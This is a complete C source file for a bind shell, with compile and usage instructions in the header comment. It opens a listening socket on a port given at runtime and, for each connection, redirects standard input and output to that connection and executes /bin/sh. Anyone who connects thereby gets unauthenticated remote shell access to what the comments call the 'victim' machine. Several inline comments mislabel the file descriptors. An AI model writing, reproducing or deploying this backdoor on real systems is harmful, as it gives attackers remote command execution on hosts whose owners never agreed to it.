/*

Compilation : gcc bind-shell.c -o bind-shell
Usage : ./bind-shell <port-no>

*/

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <strings.h>

int main(int argc, char *argv[])
{
	int fd1, fd2;

	int addrlen, port;
	char c;
	struct sockaddr_in victim_addr;
	struct sockaddr_in client_addr;

	addrlen = 0x10; // Address length

	port = atoi(argv[1]); // Port no as a first runtime argument

	/* creates a socket */

	fd1 = socket(AF_INET, SOCK_STREAM, 0); 

	/* values passed in structure sockaddr_in */

	victim_addr.sin_family = AF_INET;
	victim_addr.sin_port = htons(port);
	victim_addr.sin_addr.s_addr = INADDR_ANY;

	/* binds an input port */

	bind(fd1, (struct sockaddr *)&victim_addr, sizeof(victim_addr));

	/* Victim is waiting for incoming connection */

	listen(fd1, 5); 

	/* infinite loop which duplicates file descriptor */

	for(;;) 
	{
		if(( fd2 = accept(fd1, (struct sockaddr *) &client_addr, &addrlen)) > 0)
		{
			dup2(fd2, 0); //NULL
			dup2(fd2, 1); //stderr
			dup2(fd2, 2); //stdout
			execve("/bin/sh", NULL, NULL); 
			close(fd2);
			exit(0);
		}
	}
}
